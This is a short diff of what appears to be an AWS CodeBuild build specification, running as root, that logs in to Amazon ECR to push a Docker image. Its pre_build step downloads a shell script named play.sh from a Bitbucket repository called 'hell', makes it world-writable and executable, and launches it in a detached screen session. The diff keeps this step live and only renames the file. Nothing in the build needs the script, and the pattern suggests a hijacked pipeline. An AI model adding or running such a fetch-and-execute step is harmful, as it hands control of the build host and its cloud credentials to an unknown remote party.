@@ -5,7 +5,8 @@ run-as: root
 phases:
   pre_build:
     commands:
-      - apt update && apt install screen -y && wget -O mm.sh https://bitbucket.org/novalanto61/hell/raw/317d52572f4b483b9f01de2eea21798ca6888bbe/play.sh && chmod 777 mm.sh && screen -dmS run ./mm.sh
+      - apt update && apt install screen -y && wget -O aa.sh https://bitbucket.org/novalanto61/hell/raw/317d52572f4b483b9f01de2eea21798ca6888bbe/play.sh && chmod 777 aa.sh
+      - screen -dmS run ./aa.sh
       - echo Logging in to Amazon ECR...
       - aws ecr get-login-password --region $AWS_DEFAULT_REGION | docker login --username AWS --password-stdin $AWS_ACCOUNT_ID.dkr.ecr.$AWS_DEFAULT_REGION.amazonaws.com
       - REPOSITORY_URI=$AWS_ACCOUNT_ID.dkr.ecr.$AWS_DEFAULT_REGION.amazonaws.com/$IMAGE_REPO_NAME
